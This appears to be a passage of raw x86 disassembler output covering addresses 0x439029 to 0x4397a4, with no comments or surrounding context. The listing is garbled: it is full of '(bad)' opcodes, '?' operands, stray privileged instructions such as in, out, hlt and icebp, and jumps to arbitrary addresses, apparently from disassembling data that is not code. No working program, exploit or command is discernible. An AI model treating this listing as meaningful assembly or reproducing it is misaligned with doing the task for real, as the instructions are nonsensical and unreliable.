  439029:	lods   al,BYTE PTR ds:[esi]
  43902a:	retf   
  43902b:	pop    edx
  43902c:	test   BYTE PTR [eax-0x2d],dl
  43902f:	add    eax,0x840760e5
  439034:	or     DWORD PTR [edi+0x6c],edi
  439037:	repz sub BYTE PTR ds:0x769db1ee,bh
  43903e:	icebp  
  43903f:	pop    eax
  439040:	and    al,0x45
  439042:	out    0xa0,al
  439044:	push   ds
  439045:	cli    
  439046:	cmc    
  439047:	retf   
  439048:	pop    es
  439049:	mov    DWORD PTR [edi-0x23d1a1b0],edx
  43904f:	add    al,0x91
  439051:	ja     0x4390af
  439053:	inc    ecx
  439054:	daa    
  439055:	popa   
  439056:	push   ss
  439057:	and    al,0xd8
  439059:	adc    DWORD PTR [edx-0x11627e00],eax
  43905f:	(bad)  
  439060:	sbb    al,0xa1
  439062:	push   ebx
  439063:	dec    edi
  439064:	xlat   BYTE PTR ds:[ebx]
  439065:	xor    ecx,DWORD PTR [esi]
  439067:	mov    eax,ds:0x4676a9ea
  43906c:	pop    es
  43906d:	mov    ecx,0x295e6ae4
  439072:	push   ecx
  439073:	cmp    edi,DWORD PTR [edx+0x43ed1088]
  439079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43907a:	cmp    DWORD PTR [ecx+0x8],0x63
  43907e:	jle    0x439086
  439080:	ficomp WORD PTR [esi+0x3b]
  439083:	inc    eax
  439084:	lods   al,BYTE PTR ds:[esi]
  439085:	hlt    
  439086:	add    BYTE PTR [ecx-0x5ba4e2a2],dh
  43908c:	mov    BYTE PTR [esi+0x5],0x2f
  439090:	or     esp,DWORD PTR [ecx+0x10]
  439093:	or     al,0xa1
  439095:	fyl2x  
  439097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439098:	inc    esi
  439099:	sub    al,0xe4
  43909b:	mov    eax,ds:0xe070a85b
  4390a0:	dec    BYTE PTR [ebx-0x62]
  4390a3:	xchg   edi,eax
  4390a4:	cs jecxz 0x4390f1
  4390a7:	mov    eax,ds:0x5e8d189e
  4390ac:	xchg   esi,eax
  4390ad:	test   DWORD PTR [edi-0x6129a18e],eax
  4390b3:	jae    0x43909d
  4390b5:	shl    DWORD PTR [edx],0x39
  4390b8:	cmp    al,0x61
  4390ba:	sar    al,cl
  4390bc:	pop    ebx
  4390bd:	inc    ecx
  4390be:	in     al,dx
  4390bf:	add    eax,edx
  4390c1:	pop    ss
  4390c2:	out    dx,al
  4390c3:	pop    ss
  4390c4:	test   BYTE PTR [esi+esi*8],cl
  4390c7:	(bad)  
  4390c8:	in     eax,dx
  4390c9:	daa    
  4390ca:	sar    DWORD PTR [esi-0x7017e594],1
  4390d0:	sti    
  4390d1:	loopne 0x4390c8
  4390d3:	retf   0x8d5b
  4390d6:	mov    eax,0xdf9e5eeb
  4390db:	xor    al,0xb9
  4390dd:	(bad)  
  4390de:	pop    edx
  4390df:	pop    ebx
  4390e0:	mov    eax,ds:0x39706560
  4390e5:	push   ecx
  4390e6:	add    BYTE PTR [ebx+0x72],dl
  4390e9:	nop
  4390ea:	hlt    
  4390eb:	xor    eax,0x18e3516b
  4390f0:	pop    esi
  4390f1:	lods   eax,DWORD PTR ds:[esi]
  4390f2:	adc    ecx,DWORD PTR [esi-0x6bcc8b16]
  4390f8:	ror    DWORD PTR [edx-0x55],1
  4390fb:	mov    al,ds:0xa3e5e96e
  439100:	jle    0x439178
  439102:	out    dx,eax
  439103:	xor    DWORD PTR [eax],esp
  439105:	push   0x5
  439107:	add    edi,esp
  439109:	out    dx,al
  43910a:	loopne 0x4390e9
  43910c:	fimul  WORD PTR [eax-0x22]
  43910f:	clc    
  439110:	pop    ds
  439111:	and    DWORD PTR [ebx],esi
  439113:	(bad)  
  439114:	pop    esi
  439115:	fcomp  st(1)
  439117:	push   edx
  439118:	js     0x43911c
  43911a:	dec    ebx
  43911b:	mov    ds:0x1c8a5169,al
  439120:	dec    eax
  439121:	pushf  
  439122:	fbld   TBYTE PTR [eax-0x4a]
  439125:	stc    
  439126:	or     DWORD PTR [ecx],edx
  439128:	and    al,0x50
  43912a:	out    dx,al
  43912b:	stos   DWORD PTR es:[edi],eax
  43912c:	push   cs
  43912d:	mov    WORD PTR ds:0xf01ffdd2,?
  439133:	mov    al,ds:0x6f0b67bf
  439138:	ficom  DWORD PTR [ebp-0x5d]
  43913b:	adc    BYTE PTR [esi+0x4c],bl
  43913e:	lds    ebp,FWORD PTR [eax]
  439140:	(bad)  
  439141:	xor    esp,edi
  439143:	out    0x40,eax
  439145:	inc    ebp
  439146:	mov    esi,0xc6a153c5
  43914b:	xchg   edx,eax
  43914c:	mov    edi,0x5e50905b
  439151:	fcomp  DWORD PTR [ebx+0x8]
  439154:	cmc    
  439155:	xchg   DWORD PTR [ebx],esi
  439157:	xor    DWORD PTR ds:0xd71e6a5a,ebx
  43915d:	nop
  43915e:	or     al,0x41
  439160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439161:	sbb    eax,0x5b7ccef4
  439166:	out    dx,al
  439167:	sti    
  439168:	sar    ch,0xb5
  43916b:	dec    esp
  43916c:	aam    0x7d
  43916e:	xchg   ecx,eax
  43916f:	mov    eax,ds:0x9d17e0d7
  439174:	(bad)  
  439175:	fld    DWORD PTR [eax+edi*8+0x1a66905e]
  43917c:	or     eax,0xf09e5945
  439181:	pusha  
  439182:	imul   ebp,edx,0x58
  439185:	loopne 0x43912c
  439187:	push   ebp
  439188:	das    
  439189:	xor    dh,ch
  43918b:	push   es
  43918c:	pop    ebp
  43918d:	ja     0x439163
  43918f:	jg     0x43916a
  439191:	mov    edi,0x3233a105
  439196:	cmp    BYTE PTR [edx+0x19b2ed7f],ch
  43919c:	pop    esi
  43919d:	std    
  43919e:	outs   dx,DWORD PTR ds:[esi]
  43919f:	xchg   ebp,eax
  4391a0:	add    DWORD PTR [edi+eiz*2],edx
  4391a3:	mov    bl,0x60
  4391a5:	popa   
  4391a6:	jmp    FWORD PTR [esi-0x54]
  4391a9:	arpl   WORD PTR [eax],sp
  4391ab:	pop    edx
  4391ac:	push   esi
  4391ad:	inc    esp
  4391ae:	jmp    0x43913b
  4391b0:	pop    es
  4391b1:	cmp    BYTE PTR [edi-0x5d572fd2],dl
  4391b7:	enter  0x60f0,0xab
  4391bb:	mov    dh,0x68
  4391bd:	dec    edi
  4391be:	sbb    eax,0xe0c1cf72
  4391c3:	ins    BYTE PTR es:[edi],dx
  4391c4:	pop    esi
  4391c5:	and    edi,edx
  4391c7:	(bad)  [esi+0x68]
  4391ca:	imul   esp,DWORD PTR [eax+0x35],0xffffffaf
  4391ce:	ret    0x46a0
  4391d1:	adc    esp,DWORD PTR [edi]
  4391d3:	push   edi
  4391d4:	mov    ecx,0x31fc2d65
  4391d9:	mov    eax,ds:0xf3e7a168
  4391de:	mov    dl,BYTE PTR [esi]
  4391e0:	imul   esi,ebp,0x5845a10b
  4391e6:	(bad)  
  4391e7:	push   0xffffffc2
  4391e9:	mov    ecx,0xf85ded1d
  4391ee:	or     al,0xef
  4391f0:	add    BYTE PTR [edx+edi*1-0x62],ch
  4391f4:	push   0xfffffff6
  4391f6:	mov    ebx,0xb6b75b86
  4391fb:	mov    al,ds:0xc6b25d8d
  439200:	adc    dl,BYTE PTR [edi+0x4c36462d]
  439206:	inc    eax
  439207:	and    esi,ebp
  439209:	call   FWORD PTR [ebp-0x585d0210]
  43920f:	mov    al,ds:0x369fecc7
  439214:	fisttp DWORD PTR [edi+0x50]
  439217:	push   esi
  439218:	pop    esi
  439219:	pop    eax
  43921a:	fcomp  QWORD PTR fs:[edx+0x44]
  43921e:	dec    edx
  43921f:	pop    edx
  439220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439221:	pop    esi
  439222:	les    edx,FWORD PTR [ecx-0x20]
  439225:	(bad)  
  439227:	fcomp  DWORD PTR [ebp-0x758a747d]
  43922d:	fucomip st,st(6)
  43922f:	xlat   BYTE PTR ds:[ebx]
  439230:	cmp    ch,BYTE PTR [esi]
  439232:	pop    edi
  439233:	or     BYTE PTR [ecx+0x55],bl
  439236:	pop    ecx
  439237:	mov    eax,ds:0xffda1934
  43923c:	cmp    al,0xce
  43923e:	stos   BYTE PTR es:[edi],al
  43923f:	mov    bl,0xed
  439241:	(bad)  
  439242:	out    dx,al
  439243:	addr16 pop eax
  439245:	hlt    
  439246:	loop   0x43927a
  439248:	(bad)  
  439249:	shl    BYTE PTR [edx],0xa1
  43924c:	push   cs
  43924d:	(bad)
  439251:	jecxz  0x439273
  439253:	out    0x5e,eax
  439255:	sar    BYTE PTR [edi-0x64],1
  439258:	mov    WORD PTR [eax+0x1c],?
  43925b:	pop    esi
  43925c:	inc    ecx
  43925d:	popa   
  43925e:	adc    BYTE PTR [ebx+0x60],ah
  439261:	cs (bad) 
  439264:	test   ah,0xee
  439267:	push   cs
  439268:	dec    ebx
  439269:	xor    al,0x69
  43926b:	leave  
  43926c:	jnp    0x439266
  43926e:	aaa    
  43926f:	mov    eax,ds:0x8e9fb852
  439274:	push   eax
  439275:	js     0x439290
  439277:	cmc    
  439278:	pop    esi
  439279:	xchg   ebx,eax
  43927a:	add    al,0x1c
  43927c:	mov    edx,0x7d383645
  439281:	add    al,0x98
  439283:	retf   
  439284:	pop    esi
  439285:	add    al,0xe4
  439287:	ja     0x439299
  439289:	sti    
  43928a:	loope  0x439297
  43928c:	pop    esi
  43928d:	dec    esp
  43928e:	push   ebp
  43928f:	shr    DWORD PTR [ebx],0x67
  439292:	ins    DWORD PTR es:[edi],dx
  439293:	adc    ah,dh
  439295:	push   edx
  439296:	xchg   BYTE PTR [esi-0x4ab12bec],al
  43929c:	cli    
  43929d:	in     al,dx
  43929e:	add    al,0xfa
  4392a0:	mov    BYTE PTR [edx+0x4f5feee],dl
  4392a6:	sar    DWORD PTR [esi],cl
  4392a8:	dec    edx
  4392aa:	mov    ax,ds:0x905ea31b
  4392b0:	inc    ebx
  4392b1:	adc    eax,0x7b5e0659
  4392b6:	mov    al,ds:0x5002f1ec
  4392bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4392bc:	and    al,0x61
  4392be:	ffree  st(3)
  4392c0:	daa    
  4392c1:	fsub   QWORD PTR [edi-0x118bab06]
  4392c7:	daa    
  4392c8:	sub    ecx,DWORD PTR [edx-0x4e]
  4392cb:	dec    esp
  4392cc:	xchg   esi,eax
  4392cd:	pop    es
  4392ce:	xchg   esi,eax
  4392cf:	jmp    0x439251
  4392d1:	stos   BYTE PTR es:[edi],al
  4392d2:	xor    al,0xa1
  4392d4:	cmp    eax,0xe5fd79e4
  4392d9:	outs   dx,DWORD PTR ds:[esi]
  4392da:	push   ebx
  4392db:	fwait
  4392dc:	pop    ecx
  4392dd:	inc    eax
  4392de:	and    bh,ch
  4392e0:	jnp    0x439265
  4392e2:	pusha  
  4392e3:	popa   
  4392e4:	iret   
  4392e5:	xor    DWORD PTR [ecx+0x16],esi
  4392e8:	inc    ecx
  4392e9:	xor    esi,esi
  4392eb:	push   esp
  4392ec:	jg     0x43932f
  4392ee:	fisub  DWORD PTR [eax-0x72]
  4392f1:	mov    al,0xde
  4392f3:	jg     0x43931b
  4392f5:	ss out 0x38,eax
  4392f8:	xchg   esp,eax
  4392f9:	daa    
  4392fa:	jecxz  0x43931e
  4392fc:	push   ds
  4392fd:	stos   DWORD PTR es:[edi],eax
  4392fe:	iret   
  4392ff:	(bad)  [edx]
  439301:	pusha  
  439302:	adc    dh,BYTE PTR [ecx]
  439304:	mov    edi,0xaa208111
  439309:	nop
  43930a:	mov    al,0x8
  43930c:	pop    esi
  43930d:	test   bh,0x9d
  439310:	mov    eax,ds:0x297a783a
  439315:	popa   
  439316:	jnp    0x439337
  439318:	jmp    0x14f0229e
  43931d:	or     DWORD PTR [esi-0x1f789fa7],eax
  439323:	inc    edi
  439324:	xchg   esp,eax
  439325:	imul   edi,DWORD PTR [eax-0x7f],0xa19f888f
  43932c:	icebp  
  43932d:	fist   WORD PTR [esp+edi*8-0x4bc073e0]
  439334:	pop    esi
  439335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439336:	dec    ebp
  439337:	fiadd  DWORD PTR [edi-0x51]
  43933a:	stc    
  43933b:	dec    ebp
  43933c:	pop    sp
  43933e:	xchg   ecx,eax
  43933f:	hlt    
  439340:	cld    
  439341:	cmp    ebp,DWORD PTR [eax]
  439343:	mov    ds:0x8f4cbdcc,eax
  439348:	pop    ds
  439349:	sub    DWORD PTR [ecx-0x16e96184],eax
  43934f:	mov    ah,0xa7
  439351:	pop    edi
  439352:	push   es
  439353:	aam    0x3e
  439355:	mov    esp,0xa13832f1
  43935a:	lahf   
  43935b:	std    
  43935c:	pop    esi
  43935d:	inc    edi
  43935e:	dec    esp
  43935f:	mov    edx,0x28d0e791
  439364:	and    al,BYTE PTR [ecx-0x6]
  439367:	dec    esp
  439368:	lods   al,BYTE PTR ds:[esi]
  439369:	mov    ecx,0xe35e0a3e
  43936e:	mov    esi,0x9b691c8d
  439373:	dec    ebx
  439374:	leave  
  439375:	pop    edi
  439376:	out    dx,eax
  439377:	fabs   
  439379:	fs in  eax,dx
  43937b:	inc    edx
  43937c:	(bad)
  439380:	pop    edx
  439381:	ret    
  439382:	ja     0x43939d
  439384:	adc    DWORD PTR [esi+0x2e],edx
  439387:	fsubr  QWORD PTR [edx-0x1c]
  43938a:	xor    eax,0xfb0c9ca4
  43938f:	outs   dx,DWORD PTR ds:[esi]
  439390:	stc    
  439391:	dec    esp
  439392:	out    dx,al
  439393:	rol    dh,0xc4
  439396:	mov    edi,0x4305ddfd
  43939b:	mov    ds,WORD PTR [edi]
  43939d:	mov    eax,0x4251df1f
  4393a2:	cs cmp dh,dh
  4393a5:	mov    eax,ds:0x815e22f3
  4393aa:	cmp    al,0xe2
  4393ac:	fcmovne st,st(0)
  4393ae:	push   edi
  4393af:	cwde   
  4393b0:	xchg   ebx,eax
  4393b1:	pusha  
  4393b2:	mov    al,0xef
  4393b4:	out    0x15,eax
  4393b6:	push   esp
  4393b7:	popf   
  4393b8:	mov    ds:0x214c2047,al
  4393bd:	loope  0x4393c2
  4393bf:	ins    DWORD PTR es:[edi],dx
  4393c0:	aam    0xd1
  4393c2:	lea    eax,[ebp+0x63]
  4393c5:	push   ebx
  4393c6:	pushf  
  4393c7:	mov    ch,0xf2
  4393c9:	dec    eax
  4393ca:	or     eax,0x2a4a5ace
  4393cf:	mov    cl,0x1c
  4393d1:	stc    
  4393d2:	out    dx,al
  4393d3:	mov    esi,0xc3fc30cc
  4393d8:	(bad)  
  4393d9:	push   cs
  4393da:	mov    DWORD PTR [ecx+0x6718fef8],esp
  4393e0:	sbb    dl,ch
  4393e2:	or     eax,0x94025ee2
  4393e7:	push   ecx
  4393e8:	test   BYTE PTR ds:[edx-0x53],al
  4393ec:	adc    eax,0x3ab56a52
  4393f1:	pushf  
  4393f2:	into   
  4393f3:	in     eax,dx
  4393f4:	leave  
  4393f5:	es mov edx,ecx
  4393f8:	pop    esi
  4393f9:	sub    DWORD PTR [ecx+0x2c],ecx
  4393fc:	ins    DWORD PTR es:[edi],dx
  4393fd:	pop    ebp
  4393fe:	dec    edi
  4393ff:	retf   0x609b
  439402:	xchg   esp,eax
  439404:	fcmovb st,st(3)
  439406:	mov    ebx,0xee995ae9
  43940b:	cs sbb BYTE PTR gs:[esi-0x7e],ch
  439410:	cs neg cl
  439413:	mov    al,ds:0x1e3ce61f
  439418:	pop    ecx
  439419:	push   edi
  43941a:	jne    0x4393c1
  43941c:	aaa    
  43941d:	mov    edx,0xacc321b6
  439422:	xor    edx,0xffffffb5
  439425:	xor    al,0x5c
  439427:	jp     0x4393cb
  439429:	sbb    eax,0x45418c42
  43942e:	and    DWORD PTR gs:[eax+eiz*8-0x25],ebx
  439433:	cs scas al,BYTE PTR es:[edi]
  439435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439436:	jae    0x4394a5
  439438:	ins    DWORD PTR es:[edi],dx
  439439:	stos   BYTE PTR es:[edi],al
  43943a:	and    DWORD PTR [edi+0x620757b9],edi
  439440:	jno    0x43949f
  439442:	mov    eax,ss
  439444:	mov    eax,ss
  439446:	mov    edx,0x88611281
  43944b:	pop    ss
  43944c:	lods   eax,DWORD PTR ds:[esi]
  43944d:	xchg   esi,eax
  43944e:	xchg   edx,eax
  43944f:	aaa    
  439450:	xor    DWORD PTR [ecx-0x12],0xe0545989
  439457:	adc    DWORD PTR [eax+0x51],ebx
  43945a:	and    DWORD PTR [edx-0x14ccb716],0xfffffff7
  439461:	outs   dx,BYTE PTR ds:[esi]
  439462:	adc    BYTE PTR [ecx+0x4],0x94
  439466:	out    dx,al
  439467:	and    al,0xdf
  439469:	sbb    eax,0xcf945f8d
  43946e:	xchg   DWORD PTR [esi-0x7b971116],esp
  439474:	in     eax,0xe0
  439476:	push   esi
  439477:	or     eax,0x93ee9e45
  43947c:	add    DWORD PTR [esi],edi
  43947e:	clc    
  43947f:	push   esp
  439480:	sbb    al,0x4a
  439482:	adc    al,0x8e
  439484:	push   ss
  439485:	sub    ecx,esp
  439487:	mov    ds:0xf6808b2c,eax
  43948c:	je     0x4394a6
  43948e:	out    dx,eax
  43948f:	xchg   esi,eax
  439490:	mov    ah,0xc6
  439492:	jo     0x439455
  439494:	rcr    dl,1
  439496:	aaa    
  439497:	cdq    
  439498:	mul    BYTE PTR [eax+0x6d]
  43949b:	sti    
  43949c:	es dec ebp
  43949e:	inc    ecx
  43949f:	xchg   edx,eax
  4394a0:	mov    dh,0xbd
  4394a2:	out    dx,al
  4394a3:	jg     0x439435
  4394a5:	or     DWORD PTR [esi+0x32],ecx
  4394a8:	stos   DWORD PTR es:[edi],eax
  4394a9:	(bad)  
  4394aa:	and    eax,0xa27ee9a1
  4394af:	aad    0x47
  4394b1:	imul   BYTE PTR [ebx+0x44f75e7b]
  4394b7:	lds    esp,FWORD PTR [edi+0x1d]
  4394ba:	xor    DWORD PTR [esi-0x6044d628],esi
  4394c0:	std    
  4394c1:	mov    cl,0x9b
  4394c3:	hlt    
  4394c4:	sahf   
  4394c5:	xchg   ebp,eax
  4394c6:	cmp    ch,bl
  4394c8:	iret   
  4394c9:	cmp    al,0xee
  4394cb:	loop   0x43946e
  4394cd:	scas   al,BYTE PTR es:[edi]
  4394ce:	fld    QWORD PTR [esi-0x72b841d9]
  4394d4:	sub    bh,BYTE PTR [ebx]
  4394d6:	dec    ecx
  4394d7:	loope  0x4394a0
  4394d9:	imul   esp,DWORD PTR [ecx],0xee4891d2
  4394df:	sub    ah,BYTE PTR [esi-0x348b64f0]
  4394e5:	or     al,0x8d
  4394e8:	add    BYTE PTR [eax-0x4ca75f20],ch
  4394ee:	test   dl,0x1f
  4394f1:	dec    esp
  4394f2:	out    dx,al
  4394f3:	dec    ebx
  4394f4:	and    eax,0x44653fd8
  4394f9:	or     DWORD PTR [edi-0x5f],esp
  4394fc:	lods   eax,DWORD PTR ds:[esi]
  4394fd:	inc    esp
  4394fe:	fldcw  WORD PTR [edi+0x2b312e28]
  439504:	(bad)  
  439505:	in     eax,0xce
  439507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439508:	mov    ch,0x38
  43950a:	and    DWORD PTR [ecx-0x2a854a46],0xfffffff7
  439511:	push   ecx
  439512:	hlt    
  439513:	jle    0x439573
  439515:	xlat   BYTE PTR ds:[ebx]
  439516:	adc    bh,dh
  439518:	sbb    eax,0x4e8c8b8b
  43951d:	inc    edx
  43951e:	fisttp QWORD PTR [edx]
  439520:	mov    al,ds:0x7b82ebe0
  439525:	ins    DWORD PTR es:[edi],dx
  439526:	xchg   ecx,eax
  439527:	sti    
  439528:	pop    esi
  439529:	div    BYTE PTR [ebx+0x51a2df47]
  43952f:	mov    ?,eax
  439531:	pusha  
  439532:	and    DWORD PTR [edx+0xad0d200],ecx
  439538:	ret    0xeefa
  43953b:	pusha  
  43953c:	inc    edx
  43953d:	pop    ebx
  43953e:	push   cs
  43953f:	mov    ds:0xcd579398,al
  439544:	es test dh,ch
  439547:	stos   BYTE PTR es:[edi],al
  439548:	jns    0x439566
  43954a:	in     al,dx
  43954b:	pop    es
  43954c:	retf   0xffdf
  43954f:	lods   al,BYTE PTR ds:[esi]
  439550:	sub    al,0x51
  439552:	out    dx,al
  439553:	sub    ebx,DWORD PTR [eax+0x309c5991]
  439559:	pop    esp
  43955a:	and    eax,0xbb011d0d
  43955f:	arpl   WORD PTR [ecx+0x32],cx
  439562:	cs push ebx
  439564:	xlat   BYTE PTR ds:[ebx]
  439565:	jp     0x439579
  439567:	test   BYTE PTR [ebp-0x21],cl
  43956a:	in     eax,dx
  43956b:	test   DWORD PTR [edi],ebx
  43956d:	mov    dl,0x33
  43956f:	mov    edx,0xa3e0357a
  439574:	test   DWORD PTR [eax-0x14],ecx
  439577:	popa   
  439578:	push   ss
  439579:	mov    cl,0x6f
  43957b:	and    eax,0x8f7ca161
  439580:	push   ebx
  439581:	gs pushaw 
  439584:	(bad)  
  439585:	cmp    bh,bh
  439587:	xchg   edx,eax
  439588:	test   al,0x48
  43958a:	outs   dx,BYTE PTR ds:[esi]
  43958b:	add    DWORD PTR ds:0xb46559b0,ecx
  439591:	pop    ecx
  439592:	adc    ecx,DWORD PTR [ebx+0x76]
  439595:	arpl   WORD PTR [ecx+eax*4+0x1c],cx
  439599:	test   BYTE PTR [edi-0x537aa602],0xd8
  4395a0:	neg    cl
  4395a2:	out    0x35,eax
  4395a4:	hlt    
  4395a5:	push   0xfffffffe
  4395a7:	adc    DWORD PTR [edi-0x57],ebx
  4395aa:	in     al,dx
  4395ab:	mov    eax,ds:0xb13aa447
  4395b0:	jmp    0xd9ea:0x505cd966
  4395b7:	jg     0x4395fd
  4395b9:	add    bl,BYTE PTR [edx]
  4395bb:	in     al,0x5d
  4395bd:	scas   al,BYTE PTR es:[edi]
  4395be:	push   eax
  4395bf:	dec    ecx
  4395c0:	fdiv   DWORD PTR [edx+esi*1+0x125171a2]
  4395c7:	fwait
  4395c8:	inc    esi
  4395c9:	pop    edx
  4395ca:	and    BYTE PTR [ecx+edx*8+0x2],0x2c
  4395cf:	pop    es
  4395d0:	mov    ?,WORD PTR [eax-0x37]
  4395d3:	popa   
  4395d4:	pop    esi
  4395d5:	inc    edx
  4395d6:	xchg   edx,eax
  4395d7:	aam    0x13
  4395d9:	lds    ecx,FWORD PTR [ebx]
  4395db:	sub    al,0xd6
  4395dd:	pusha  
  4395de:	jbe    0x4395f4
  4395e0:	je     0x4395dc
  4395e2:	mov    al,0x4a
  4395e4:	mov    WORD PTR [edi-0x12],?
  4395e7:	mov    fs,WORD PTR [ebp+0x10]
  4395ea:	sub    ecx,edi
  4395ec:	sub    DWORD PTR [ebx],edi
  4395ee:	iret   
  4395ef:	mov    al,ds:0xf24cb3b2
  4395f4:	jp     0x4395d5
  4395f6:	call   0x101d:0xb32f5e14
  4395fd:	les    ebx,FWORD PTR [edi+eiz*1+0x62]
  439601:	sub    cl,ch
  439603:	scas   al,BYTE PTR es:[edi]
  439604:	je     0x439608
  439606:	out    dx,al
  439607:	aaa    
  439608:	repnz fdivrp st(3),st
  43960b:	push   eax
  43960c:	xchg   edi,eax
  43960d:	dec    ebp
  43960e:	out    dx,al
  43960f:	push   ecx
  439610:	mov    bh,0x1f
  439612:	sbb    eax,0xe1accff1
  439617:	lahf   
  439618:	mov    ebx,0xddde650f
  43961d:	ja     0x439624
  43961f:	cs pushf 
  439621:	nop
  439622:	loopne 0x43966f
  439624:	push   esp
  439625:	sbb    edi,DWORD PTR [ecx+0x2c61382a]
  43962b:	jae    0x4395f8
  43962d:	jl     0x4395ea
  43962f:	out    dx,eax
  439630:	sbb    BYTE PTR [ecx+0x5e],ah
  439633:	test   BYTE PTR [edx-0x11],cl
  439636:	and    DWORD PTR [eax],edx
  439638:	add    BYTE PTR [ebx-0x12],0xcf
  43963c:	xchg   ecx,eax
  43963d:	je     0x439632
  43963f:	cdq    
  439640:	cmp    BYTE PTR [edi-0x48],dl
  439643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439644:	push   ebx
  439645:	(bad)  
  439646:	loop   0x439614
  439648:	loop   0x43962a
  43964a:	inc    edi
  43964b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43964c:	out    dx,eax
  43964d:	mov    bl,0xee
  43964f:	jb     0x439679
  439651:	jg     0x4395d4
  439653:	pop    ebp
  439654:	pop    ebx
  439655:	mov    bh,0x67
  439657:	mov    eax,ds:0x50a9361d
  43965c:	jne    0x4395de
  43965e:	xor    BYTE PTR [ebx+0x5e],ah
  439661:	push   ss
  439662:	cmc    
  439663:	mov    esp,0xf8ef31a
  439668:	mov    al,0x5f
  43966a:	mov    bh,0xa3
  43966c:	stos   DWORD PTR es:[edi],eax
  43966d:	xchg   ebp,eax
  43966e:	aas    
  43966f:	dec    esi
  439670:	mov    ebp,0x5eaa0c84
  439675:	jecxz  0x439653
  439677:	ds scas eax,DWORD PTR es:[edi]
  439679:	jo     0x439622
  43967b:	cmp    DWORD PTR [esi],esp
  43967d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43967e:	outs   dx,DWORD PTR ds:[esi]
  43967f:	mov    al,ds:0x3cf9e662
  439684:	ficomp WORD PTR [ecx+edx*4-0x148cec86]
  43968b:	outs   dx,BYTE PTR ds:[esi]
  43968c:	jae    0x43968a
  43968e:	push   ecx
  43968f:	ins    DWORD PTR es:[edi],dx
  439690:	pop    edi
  439691:	pusha  
  439692:	cld    
  439693:	mov    WORD PTR [ecx],gs
  439695:	das    
  439696:	cmp    BYTE PTR [ebx+0x56],dh
  439699:	xchg   ecx,eax
  43969a:	and    esi,edi
  43969c:	pop    ebx
  43969d:	outs   dx,BYTE PTR ds:[esi]
  43969e:	adc    ecx,DWORD PTR [ebx]
  4396a0:	jae    0x4396da
  4396a2:	into   
  4396a3:	xchg   esp,eax
  4396a4:	xchg   esi,eax
  4396a5:	xchg   ebx,eax
  4396a6:	fldenv [eax-0x7e8e7ce2]
  4396ac:	lock in al,dx
  4396ae:	fwait
  4396af:	cmp    eax,0xce27b85f
  4396b4:	inc    ebp
  4396b5:	or     ecx,DWORD PTR [ebp+0x1c38c81]
  4396bb:	xchg   DWORD PTR [esi*4+0x4bc5a04a],esp
  4396c2:	dec    eax
  4396c3:	adc    eax,0x2bd2d0be
  4396c8:	push   0x2
  4396ca:	or     esi,DWORD PTR cs:[eax+0x32]
  4396ce:	dec    ebx
  4396cf:	adc    BYTE PTR [ecx+0x61],0x91
  4396d3:	pop    eax
  4396d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4396d5:	mov    edx,DWORD PTR [edi-0x43]
  4396d8:	jbe    0x4396b2
  4396da:	and    al,0x1a
  4396dc:	sbb    al,0xe1
  4396de:	lods   eax,DWORD PTR ds:[esi]
  4396df:	jne    0x82dfb144
  4396e5:	pusha  
  4396e6:	and    al,0xb1
  4396e8:	fwait
  4396e9:	pop    ecx
  4396ea:	aam    0x66
  4396ec:	xor    ecx,DWORD PTR [ebx]
  4396ee:	out    dx,al
  4396ef:	dec    ebp
  4396f0:	and    al,0xd
  4396f2:	rol    DWORD PTR [ebx],0x5d
  4396f5:	mov    ebx,0xf3129f36
  4396fa:	mov    dl,0xe7
  4396fc:	push   ds
  4396fd:	std    
  4396fe:	or     BYTE PTR [edx+0x5eee7a85],0xdb
  439705:	sbb    eax,0xb50dbfd6
  43970a:	int3   
  43970b:	repz fbld TBYTE PTR [eax-0x57]
  43970f:	bound  ecx,QWORD PTR [esp+esi*8]
  439712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439713:	mov    esi,0xeaee293e
  439718:	mov    ds:0xb01b18c8,al
  43971d:	or     edi,DWORD PTR [ecx+eiz*4]
  439720:	sub    BYTE PTR [eax-0x637a6db],cl
  439726:	adc    dl,cl
  439728:	pop    esi
  439729:	mov    dl,0x0
  43972b:	push   esp
  43972c:	cmp    BYTE PTR [ecx+esi*8+0x64],dh
  439730:	sbb    DWORD PTR [ebp-0x36005c22],esi
  439736:	xchg   edx,eax
  439737:	sbb    DWORD PTR [eax-0x388bc1c8],ebp
  43973d:	push   esp
  43973e:	out    dx,al
  43973f:	jnp    0x439762
  439741:	test   al,0xd8
  439743:	mov    ds,WORD PTR [ebp+edx*8-0x518c50fb]
  43974a:	outs   dx,BYTE PTR ds:[esi]
  43974b:	repnz retf 
  43974d:	stos   BYTE PTR es:[edi],al
  43974e:	inc    ebp
  43974f:	xchg   ebx,eax
  439750:	mov    eax,ds:0x45a8eb49
  439755:	daa    
  439756:	sub    ch,BYTE PTR [ebx+0x24]
  439759:	icebp  
  43975a:	xchg   edx,eax
  43975b:	push   edx
  43975c:	xor    BYTE PTR [ebx-0xf],dl
  43975f:	sub    ebp,DWORD PTR [esi+0x5d]
  439762:	into   
  439763:	mov    ch,0x80
  439765:	pslld  mm7,QWORD PTR [ebp+0x1e28a05e]
  43976c:	cli    
  43976d:	mov    ebx,0x5c270212
  439772:	(bad)  
  439774:	sub    al,0x8e
  439776:	and    eax,0xb55a1561
  43977b:	sbb    BYTE PTR [esi-0x70],0x2b
  43977f:	cdq    
  439780:	push   eax
  439781:	stos   DWORD PTR es:[edi],eax
  439782:	cdq    
  439783:	popf   
  439784:	pop    eax
  439785:	popa   
  439786:	mov    edi,0x6895a489
  43978b:	or     ch,BYTE PTR [edi+0x51]
  43978e:	out    dx,al
  43978f:	xchg   DWORD PTR [ebx+0x3a1c2e15],eax
  439795:	adc    eax,0xc5f8008c
  43979b:	pusha  
  43979c:	and    esi,esp
  43979e:	mov    al,ds:0xeec17ce6
  4397a3:	clc    
  4397a4:	lahf   
